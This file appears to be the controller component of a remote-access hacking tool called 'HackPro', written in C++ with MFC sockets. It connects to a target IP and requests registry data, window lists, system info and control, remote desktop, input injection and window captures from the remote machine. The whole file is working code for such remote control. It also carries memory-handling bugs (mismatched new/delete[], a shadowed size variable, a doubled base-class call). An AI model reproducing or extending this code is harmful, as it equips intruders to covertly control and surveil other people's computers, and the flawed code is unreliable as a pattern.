// HackClient.cpp : implementation file
//

#include "stdafx.h"
#include "papahead.h"
#include "HackClient.h"
class CHackClient;

// CHackClient


CHackClient::CHackClient():Page_RegConfig(this),Page_WndList(this),Page_SysInfo(this),Page_SysCtrl(this),Page_RemoteDesktop(this)
{
	/*
	
	*/
	FT[1]=CRegConfigDlg::CALLBACK_RegVal;
	FT[2]=CWndTree::CallBack_WndFillInfo;
	FT[3]=CWndTree::CallBack_WndFn; 
	FT[4]=SysInfo::CALLBACK_SysInfo;
	FT[5]=SysCtrl::CALLBACK_SysCtrl;
	FT[9]=CDesktop::CALLBACK_SetDesktop;
	FT[11]=CDesktop::CALLBACK_InputMsg;
	FT[12]=CWndList::CALLBACK_CaptureWindow;

	
}


CHackClient::~CHackClient()
{
	
}


// CHackClient member functions
/**
	call this function to connect remote computer
*/
bool CHackClient::Connect(char *ip)
{
	BOOL b= this->Create();
	HostIP.Format("%s",ip);
	if(b==0)
	{
		Error("Error During the Creating the client",GetLastError());
		return false;

	}
	if(CSocket::Connect(ip,258)==0)
	{
		//Error("Error During the Connecting the Host",GetLastError());
		return false;
	}
	
	return true; 
}
/**
	Called by the framework to notify this socket that there is data in the buffer
	that can be retrieved by calling the Receive member function.
*/
void CHackClient::OnReceive(int nErrorCode)
{
	if(nErrorCode==0)
	{
		
		int ByteRead=Receive((void*)&FBuff,sizeof(Fetch));
		if(ByteRead!=sizeof(Fetch))
		{
			Error("Error during reading the Message",GetLastError());
			CSocket::OnReceive(nErrorCode) ;
			return;
		}
		if(FBuff.datasize !=0)
		{
			this->Data=new char[FBuff.datasize];
			int BR,DS;
			DS=FBuff.datasize;
			BR=Receive((void*)Data,FBuff.datasize);
			
			while(BR!=DS)
			{
				int tbr=0;
				tbr=Receive((char*)Data+BR,FBuff.datasize-BR);
				BR = BR + tbr;
				if(tbr<=0)
				{
					break;
				}
			}
		}
		else
		{
			this->Data=new char;
        }
		
		//this->Waiting =false;
		this->ProcessIntr(FBuff.function,FBuff.callback,FBuff.datasize,this->Data); 
				
		CSocket::OnReceive(nErrorCode);
	}

	CSocket::OnReceive(nErrorCode);
}
/**
	This function processes the request made by remote system
*/
void CHackClient::ProcessIntr(int function,int callback,int datasize,void* data)
{
	if(function>0)
	{
			void* RetData;
			int RetDataSize=0;
			Function fun = FT[function];
			RetData=fun(data,datasize);
			if(RetData==NULL)
			{
				int RetDataSize=0;
				int PacketSize=sizeof(Fetch);
			}
			else
			{
				int* rdsize=(int*)RetData;
				RetDataSize=rdsize[0];
			}
			int PacketSize=sizeof(Fetch)+RetDataSize;
			
			//allocate the buffer
			char* DataToSend=new char [PacketSize];
			
			Fetch f;
			f.function =callback;
			f.callback =0;
			f.datasize =RetDataSize;
			
			
			
			//copy to the intruction to the Packet
			memcpy(DataToSend,&f,sizeof(f));
			
			//copy the data to the Packet
			memcpy(DataToSend+sizeof(f),(char*)RetData+sizeof(int),f.datasize); 
				
			//Send the packet
			int ByteSent=0;
			ByteSent=this->Send(DataToSend,sizeof(Fetch)+RetDataSize);
			if(ByteSent!=sizeof(Fetch)+RetDataSize)
			{
				this->Error("Error in Sending Data",GetLastError()); 
						
			}
			delete[] DataToSend;
			delete[] RetData;
		}
	//SignalMutex();	
	delete[] data;
}
/**
Displays the error with formated message from error code
*/
void CHackClient::Error(char* msg,int error)
{
	
	
		CString str(msg);
		LPVOID lpMsgBuf;
		//===============================
		if(error!=0)
		{
			
			FormatMessage( 
				FORMAT_MESSAGE_ALLOCATE_BUFFER | 
				FORMAT_MESSAGE_FROM_SYSTEM | 
				FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL,
				error,
				MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
				(LPTSTR) &lpMsgBuf,
				0,
				NULL 
			);		
			str=str+"\n"+(char*)lpMsgBuf;
			MessageBox( NULL, (LPCTSTR)str, "Error(HackPro)", MB_OK | MB_ICONINFORMATION );
			LocalFree( lpMsgBuf );
			return;
		}
		str=str+"\n";
		MessageBox( NULL, (LPCTSTR)str, "Error(HackPro)", MB_OK | MB_ICONINFORMATION );
		
		///==============================
			
	

}
void CHackClient::SendRequest(int function,int callback,int datasize,void* data)
{
	
	Fetch f;
	f.function=function;
	f.callback =callback;
	f.datasize =datasize;
	int PacketSize=sizeof(Fetch)+datasize;
	char* DataToSend =new char[PacketSize];
	memcpy(DataToSend,&f,sizeof(f));
	memcpy(DataToSend+sizeof(f),data,datasize);

	
	int bytesent=this->Send(DataToSend,PacketSize);
	if(bytesent!=PacketSize)
	{
		Error("(SendRequest)Error in Sending the data",GetLastError());
		return;
	}
	return;
}

void CHackClient::OnClose(int nErrorCode)
{
	CHackProDlg *MainWnd=(CHackProDlg*)AfxGetMainWnd();
	MainWnd->RemoveHost(this->HostIP);
	CSocket::OnClose(nErrorCode);
}
